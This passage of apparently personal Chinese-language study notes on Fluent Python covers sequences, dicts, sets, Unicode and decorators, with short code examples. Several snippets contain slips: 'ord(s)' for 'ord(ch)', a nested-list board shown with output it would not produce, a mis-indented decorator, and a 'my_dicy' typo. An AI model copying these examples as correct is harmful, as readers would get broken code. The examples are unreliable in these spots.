class="string">te&#x27;</span>, <span class="string">&#x27;S&#x27;</span>), (<span class="string">&#x27;white&#x27;</span>, <span class="string">&#x27;M&#x27;</span>), (<span class="string">&#x27;white&#x27;</span>, <span class="string">&#x27;L&#x27;</span>)]</span><br></pre></td></tr></table></figure>

<h3><span id="x20生成器表达式">&#x20;生成器表达式</span></h3><p>生成器表达式可以逐个产生元素，而不是先建立一个完整列表，这种方式更加节省内存</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">symbols = <span class="string">&#x27;abcdefg&#x27;</span></span><br><span class="line"><span class="built_in">tuple</span>(<span class="built_in">ord</span>(ch) <span class="keyword">for</span> ch <span class="keyword">in</span> symbols <span class="keyword">if</span> <span class="built_in">ord</span>(s) &gt; <span class="number">100</span>)</span><br></pre></td></tr></table></figure>

<h3><span id="元组不仅是不可变列表还可用于没有字段名的记录">元组不仅是不可变列表，还可用于没有字段名的记录</span></h3><p>元组拆包</p>
<h3><span id="使用collectionsnamedtuple构建简单类">使用collections.namedtuple构建简单类</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Card = collections.namedtuple(<span class="string">&#x27;Card&#x27;</span>, \[<span class="string">&#x27;rank&#x27;</span>, <span class="string">&#x27;list&#x27;</span>]) beer\_card = Card(<span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;diamonds&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3><span id="对象切片">对象切片</span></h3><p>可以用s[a: b: c]形式对a和b之间以c为间隔取值，c的值可以为负，负值意味着反向取值。下面3个例子更直观些</p>
<p>c为负值意味着可以反向取值，举例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">&#x27;bicycle&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[::<span class="number">3</span>]</span><br><span class="line"><span class="string">&#x27;bye&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[::-<span class="number">1</span>]</span><br><span class="line"><span class="string">&#x27;elcycib&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[::-<span class="number">2</span>]</span><br><span class="line"><span class="string">&#x27;eccb&#x27;</span></span><br></pre></td></tr></table></figure>

<h3><span id="切片操作对序列做修改">切片操作对序列做修改</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">l = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">10</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l[<span class="number">2</span>:<span class="number">5</span>] = [<span class="number">20</span>, <span class="number">30</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">0</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> l[<span class="number">5</span>:<span class="number">7</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="number">0</span>, <span class="number">1</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br></pre></td></tr></table></figure>

<h3><span id="对序列使用和">对序列使用+和*</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">board = [[<span class="string">&#x27;_&#x27;</span>] * <span class="number">3</span>] * <span class="number">3</span></span><br><span class="line">board = [[<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;_&#x27;</span>],[<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;_&#x27;</span>],[<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;_&#x27;</span>]]</span><br><span class="line">board[<span class="number">1</span>][<span class="number">2</span>] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">board</span><br><span class="line">[[<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;0&#x27;</span>],[<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;0&#x27;</span>],[<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;0&#x27;</span>]]</span><br></pre></td></tr></table></figure>

<h3><span id="序列的增量赋值x20">序列的增量赋值&#x20;</span></h3><p>+&#x3D; 背后特殊方法是iadd，如果一个类没实现这种方法就回退一步调用add, 比如</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a += b</span><br></pre></td></tr></table></figure>

<ul>
<li>如果a实现了iadd，就会调用iadd，a就会就地改动； 如果a没实现iadd，a +&#x3D; b这个表达式效果和a &#x3D; a + b一样</li>
</ul>
<h3><span id="对不可变序列做拼接操作">对不可变序列做拼接操作</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(t)</span><br><span class="line"><span class="number">1737687416128</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t *= <span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t</span><br><span class="line">(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(t)</span><br><span class="line"><span class="number">1737687389568</span></span><br></pre></td></tr></table></figure>

<ul>
<li>ID发生了变化，对不可变序列进行重复拼接操作效率低，因为每次都有一个新对象，解释器需把原来对象中元素先复制到新对象，再追加新元素</li>
<li>str是一个例外，str做+&#x3D;，id不一定会变，因为CPython做了优化，str初始化时会留额外的可扩展空间，做增量操作时不一定会复制原有字符串到新位置到这类操作</li>
</ul>
<h3><span id="关于x3d的谜题">关于+&#x3D;的谜题</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = (<span class="number">1</span>,<span class="number">2</span>,[<span class="number">30</span>,<span class="number">40</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t[<span class="number">2</span>] += [<span class="number">50</span>,<span class="number">60</span>]</span><br><span class="line">TypeError: <span class="string">&#x27;tuple&#x27;</span> obj does <span class="keyword">not</span> support item assignment</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t</span><br><span class="line">(<span class="number">1</span>, <span class="number">2</span>, [<span class="number">30</span>,<span class="number">40</span>,<span class="number">50</span>,<span class="number">60</span>])</span><br></pre></td></tr></table></figure>

<p>教训：不要把可变对象放在元组里，增量赋值并非完整操作</p>
<h3><span id="listsort方法和内置函数sorted">list.sort方法和内置函数sorted</span></h3><ul>
<li>list.sort方法就地排序列表, sorted总是返回一个列表</li>
<li>两种方法都有两个可选的关键字参数<ul>
<li>reverse 如果被设定为True，降序输出</li>
<li>key，默认用元素自己的值做排序</li>
</ul>
</li>
<li>是稳定排序，每次排序结果相对位置固定的<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>fruits = [<span class="string">&#x27;grape&#x27;</span>, <span class="string">&#x27;raspberry&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">sorted</span>(fruits)</span><br><span class="line">[<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;grape&#x27;</span>, <span class="string">&#x27;raspberry&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">sorted</span>(fruits, reverse=<span class="literal">True</span>)</span><br><span class="line">[<span class="string">&#x27;raspberry&#x27;</span>, <span class="string">&#x27;grape&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">sorted</span>(fruits, key=<span class="built_in">len</span>)</span><br><span class="line">[<span class="string">&#x27;grape&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;raspberry&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">sorted</span>(fruits, key=<span class="built_in">len</span>, reverse=<span class="literal">True</span>)</span><br><span class="line">[<span class="string">&#x27;raspberry&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;grape&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fruits.sort()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fruits</span><br><span class="line">[<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;grape&#x27;</span>, <span class="string">&#x27;raspberry&#x27;</span>]</span><br></pre></td></tr></table></figure></li>
</ul>
<h3><span id="bisect操作排序插入已排序的序列">bisect操作（排序，插入已排序的序列）</span></h3><p>插入已排序的序列</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> bisect</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bisect.insort(a, <span class="number">5</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(a)</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br></pre></td></tr></table></figure>
<h3><span id="array数组">array数组</span></h3><ul>
<li><p>如需要一个只包含数字的列表, array.array比list更高效</p>
</li>
<li><p>数组支持所有可变序列相关操作，包括pop, insert, extend</p>
</li>
<li><p>数组提供从文件读取和存入文件的快速方法，如frombytes, tofile</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> array <span class="keyword">import</span> array</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> random <span class="keyword">import</span> random</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>floats = array(<span class="string">&#x27;d&#x27;</span>, (random() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>**<span class="number">7</span>)))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>floats[-<span class="number">1</span>]</span><br><span class="line"><span class="number">0.5225102971704024</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fp = <span class="built_in">open</span>(<span class="string">&#x27;floats.bin&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>floats.tofile(fp)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fp.close()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>floats2 = array(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fp = <span class="built_in">open</span>(<span class="string">&#x27;floats.bin&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>floats2.fromfile(fp, <span class="number">10</span>**<span class="number">7</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>fp.close()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>floats2[-<span class="number">1</span>]</span><br><span class="line"><span class="number">0.5225102971704024</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>floats2 == floats</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>tofile和fromfile速度比从文本文件读快60多倍，原因是后者使用内置的float把每一行文字转成浮点数</p>
</li>
<li><p>另一个快速序列化数字类型方法是使用pickle，速度和array相当，但pickle可以处理几乎所有的内置数字类型，包含复数、嵌套集合，用户自定义类</p>
</li>
</ul>
<h3><span id="x20内存视图">&#x20;内存视图</span></h3><p><code>memoryview</code>是一个内置类，能让用户在不复制内容情况下操作同一个数组的不同切片</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> array</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>numbers = array.array(<span class="string">&#x27;h&#x27;</span>, [-<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>memv = <span class="built_in">memoryview</span>(numbers)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(memv)</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>memv[<span class="number">0</span>]</span><br><span class="line">-<span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>memv_oct = memv.cast(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>memv_oct.tolist()</span><br><span class="line">[<span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>memv_oct[<span class="number">3</span>] = <span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>numbers</span><br><span class="line">array(<span class="string">&#x27;h&#x27;</span>, [-<span class="number">1</span>, <span class="number">1024</span>, <span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<h3><span id="numpy-和-scipy">NumPy 和 SciPy</span></h3><ul>
<li>NumPy提供高阶数组和矩阵操作, SciPy是基于NumPy的库，提供科学计算有关算法</li>
</ul>
<h3><span id="双向队列和其他形式的队列">双向队列和其他形式的队列</span></h3><p>collections.deque类是一个线程安全，可以快速从两端添加或删除元素的数据类型</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq = deque(<span class="built_in">range</span>(<span class="number">10</span>), maxlen=<span class="number">10</span>) ➊</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq</span><br><span class="line">deque([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>], maxlen=<span class="number">10</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.rotate(<span class="number">3</span>) ➋</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq</span><br><span class="line">deque([<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], maxlen=<span class="number">10</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.rotate(-<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq</span><br><span class="line">deque([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">0</span>], maxlen=<span class="number">10</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.appendleft(-<span class="number">1</span>) ➌</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq</span><br><span class="line">deque([-<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>], maxlen=<span class="number">10</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.extend([<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>]) ➍</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq</span><br><span class="line">deque([<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>], maxlen=<span class="number">10</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq.extendleft([<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>]) ➎</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dq</span><br><span class="line">deque([<span class="number">40</span>, <span class="number">30</span>, <span class="number">20</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>], maxlen=<span class="number">10</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>maxlen是一个可选参数，代表队列可以容纳的元素数量，一旦设定不可修改</li>
<li>rotate操作接受一个参数n，当n &gt; 0时，最右边n个元素移动到最左，n &lt; 0, 最左边n个元素移动到最右</li>
</ul>
<p>除了deque，其他Python标准库也有对队列的实现</p>
<ul>
<li>queue</li>
<li>multiprocessing 实现了自己的Queue</li>
<li>asyncio</li>
<li>heapq</li>
</ul>
<h3><span id="x20sorted-listsort背后的排序算法-timsort">&#x20;sorted, list.sort背后的排序算法 Timsort</span></h3><p>Timsort是一种自适应排序算法，会根据原始数据的顺序特点交替用插入排序和归并排序，以达到最佳效率</p>
<h2><span id="第3章-字典和集合">第3章 字典和集合</span></h2><h3><span id="可散列的数据类型">可散列的数据类型</span></h3><ul>
<li>如一个对象时可散列的，在这个对象的生命周期中，它的散列值是不变的，而且这个对象需要实现hash方法，另外可散列对象要有qe方法，才能跟其他键做比较</li>
<li>原子不可变数据类型(str, bytes, 数值类型）都是可散列类型, frozenset也是可散列的</li>
<li>对于元组，只有当一个元组包含所有元素都是可散列类型情况下，它才是可散列的</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ttt = (<span class="number">1</span>, <span class="number">2</span>, (<span class="number">30</span>, <span class="number">40</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hash</span>(ttt)</span><br><span class="line">-<span class="number">3907003130834322577</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t2 = (<span class="number">1</span>, <span class="number">2</span>, [<span class="number">30</span>, <span class="number">40</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hash</span>(t2)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: unhashable <span class="built_in">type</span>: <span class="string">&#x27;list&#x27;</span></span><br></pre></td></tr></table></figure>

<h3><span id="x20字典的构造方法">&#x20;字典的构造方法</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a =  <span class="built_in">dict</span>(one=<span class="number">1</span>, two=<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = &#123;<span class="string">&#x27;one&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;two&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = <span class="built_in">dict</span>(<span class="built_in">zip</span>([<span class="string">&#x27;one&#x27;</span>, <span class="string">&#x27;two&#x27;</span>], [<span class="number">1</span>,<span class="number">2</span>]))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = <span class="built_in">dict</span>([(<span class="string">&#x27;one&#x27;</span>,<span class="number">1</span>), (<span class="string">&#x27;two&#x27;</span>,<span class="number">2</span>)])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = <span class="built_in">dict</span>(&#123;<span class="string">&#x27;one&#x27;</span>:<span class="number">1</span>, <span class="string">&#x27;two&#x27;</span>:<span class="number">2</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a == b == c == d == e</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h3><span id="字典推导">字典推导</span></h3><p>字典推导可以从任何以键值对作为元素可迭代对象中构建出字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>array = [(<span class="string">&#x27;one&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;two&#x27;</span>, <span class="number">2</span>), (<span class="string">&#x27;three&#x27;</span>, <span class="number">3</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dic = &#123;k: v <span class="keyword">for</span> v, k <span class="keyword">in</span> array&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dic</span><br><span class="line">&#123;<span class="number">1</span>: <span class="string">&#x27;one&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;two&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;three&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="用setdefault处理找不到的键">用setdefault处理找不到的键</span></h3><p>以下两种写法是等价的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> my_dict:</span><br><span class="line">	my_dict[key] = []</span><br><span class="line">my_dicy[key].append(new_value)</span><br><span class="line"></span><br><span class="line">my_dict.setdefault(key, []).append(new_value)</span><br></pre></td></tr></table></figure>

<p>也可以用get方法获得key对应的value，如果不存在返回默认值</p>
<pre><code>&gt;&gt;&gt; dic = &#123; 1: &#39;one&#39;&#125;
&gt;&gt;&gt; dic.get(2, &#39;N/A&#39;)
&#39;N/A&#39;
</code></pre>
<h3><span id="字典的变种">字典的变种</span></h3><p>collections.OrderedDict</p>
<p>添加key时会保持顺序</p>
<p>collections.ChainMap</p>
<p>容纳数个不同映射对象，进行key查找时，这些对象会被当做一个整体被逐个查找</p>
<h3><span id="不可变映射类型">不可变映射类型</span></h3><p>MappingProxyType</p>
<h3><span id="集合论">集合论</span></h3><p>set和它的不可变姊妹类型frozenset，集合中元素必须是可散列的</p>
<p>创建空集合用 set(), frozenset({0,1,2,3})</p>
<h3><span id="往字典里添加新键可能会改变已有键顺序">往字典里添加新键可能会改变已有键顺序</span></h3><p>不要对字典同时进行迭代和修改，最好分两步：首先对字典迭代，得出要添加内容，把这些内容放在一个新字典里，迭代结束后再对原有字典进行更新</p>
<h2><span id="第4章-文本和字节序列">第4章 文本和字节序列</span></h2><ul>
<li>字符、码位和字节表述&#x20;</li>
<li>bytes、bytearray 和 memoryview 等二进制序列的独特特性&#x20;</li>
<li>全部 Unicode 和陈旧字符集的编解码器&#x20;</li>
<li>避免和处理编码错误&#x20;</li>
<li>处理文本文件的最佳实践&#x20;</li>
<li>默认编码的陷阱和标准 I&#x2F;O 的问题&#x20;</li>
<li>规范化 Unicode 文本，进行安全的比较&#x20;</li>
<li>规范化、大小写折叠和暴力移除音调符号的实用函数&#x20;</li>
<li>使用 locale 模块和 PyUCA 库正确地排序 Unicode 文本&#x20;</li>
<li>Unicode 数据库中的字符元数据 能处理字符串和字节序列的双模式 API</li>
</ul>
<p>字符串是一个字符序列，从Python3的str对下井获取元素是Unicode字符，Unicode标准把字符的标识和具体字节表述进行如下明确区分</p>
<ul>
<li>字符标识，即码位，是0-1114111的数字，在Unicode标准中以4-6个十六进制数字表示，加前缀U+, 例如字母A的码位是U+0041，欧元符号码位阿是U+20AC</li>
<li>字符具体表述取决于所用编码，UTF-8中, A(U+0041)的码位编码成单个字节\x41, 而在UTF-16LE编码中编成两个字节\x41\x00</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">&#x27;café&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(s)</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = s.encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line"><span class="string">b&#x27;caf\xc3\xa9&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(b)</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;café&#x27;</span></span><br></pre></td></tr></table></figure>

<h3><span id="字节概要">字节概要</span></h3><p>Python内置两种基本二进制序列类型： bytes, bytearray</p>
<h3><span id="bom是什么">BOM是什么</span></h3><p>字节序标记 byte-order mark</p>
<h2><span id="x20第7章-函数装饰器和闭包">&#x20;第7章 函数装饰器和闭包</span></h2><p>装饰器特性，能把被装饰的函数替换成其他函数， 第二个特性：装饰器在加载模块时立即执行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">deco</span>(<span class="params">func</span>):</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;running inner()&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"><span class="meta">@deco</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">target</span>():</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;running target()&#x27;</span>)</span><br><span class="line"></span><br><span class="line">target()</span><br><span class="line">running inner()</span><br></pre></td></tr></table></figure>

<p>打印函数运行时间</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc_time</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        t1 = time.time()</span><br><span class="line">        func(*args, **kwargs)</span><br><span class="line">        t2 = time.time()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;func &#123;&#125; costs &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(func.__name__, t2 - t1))</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@calc_time</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a, b</span>):</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">$ python calc.py</span><br><span class="line">func add costs <span class="number">5.014971017837524</span></span><br></pre></td></tr></table></figure>

<h3><span id="为什么用闭包">为什么用闭包</span></h3><p>举例：求平均数，每次调用avg，新增一个数并重新计算平均值</p>
<p>实现方法1：缺点是需定义全局变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">total = <span class="number">0</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">avg</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">global</span> total,count</span><br><span class="line">    total += n</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> total / count</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(avg(<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(avg(<span class="number">11</span>))</span><br></pre></td></tr></table></figure>

<p>实现方法2：使用类，缺点是麻烦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Aver</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.series = []</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="variable language_">self</span>.series.append(value)</span><br><span class="line">        total = <span class="built_in">sum</span>(<span class="variable language_">self</span>.series)</span><br><span class="line">        <span class="keyword">return</span> total/<span class="built_in">len</span>(<span class="variable language_">self</span>.series)</span><br><span class="line"></span><br><span class="line">avg = Aver()</span><br><span class="line"><span class="built_in">print</span>(avg(<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(avg(<span class="number">11</span>))</span><br></pre></td></tr></table></figure>

<p>实现方法3：用函数，引入nonocal声明</p>
